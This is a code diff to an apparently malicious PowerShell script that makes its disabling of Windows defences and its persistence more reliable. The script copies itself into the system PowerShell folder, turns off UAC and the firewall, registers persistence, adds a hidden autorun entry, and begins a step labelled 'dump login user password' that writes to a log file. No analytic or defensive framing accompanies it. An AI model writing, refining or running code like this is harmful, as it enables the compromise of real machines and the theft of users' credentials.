@@ -9,9 +9,9 @@ cp $MyInvocation.MyCommand.Path "C:\Windows\System32\WindowsPowerShell\v1.0\1.ps
 
 
 if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
-	
+
 	# turn of the LUA and firewall
-	Set-ItemProperty -Path HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System -Name EnableLUA -Value 0x00000000
+	New-ItemProperty -Path "HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System" -Name EnableLUA -PropertyType DWORD -Value 0x00000000 -Force
 	netsh advfirewall set allprofiles state off
 
 	# add persistence
@@ -19,7 +19,8 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
 	Add-Persistence -ScriptPath "C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1"
 
 	# auto-run
-	New-ItemProperty -Path HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/run -Name Sysprep -PropertyType String -Value "C:\Windows\System32\Sysprep\sysprep.exe"
+	New-ItemProperty -Path "HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/run" -Name Sysprep -PropertyType String -Value  `
+    'powershell -NoP -NonI -W Hidden -c "Start-Process C:\Windows\System32\Sysprep\sysprep.exe -WindowStyle Hidden"' -Force
 
 	# dump login user password
 	$strFileName="c:\windows\zaccount.log"
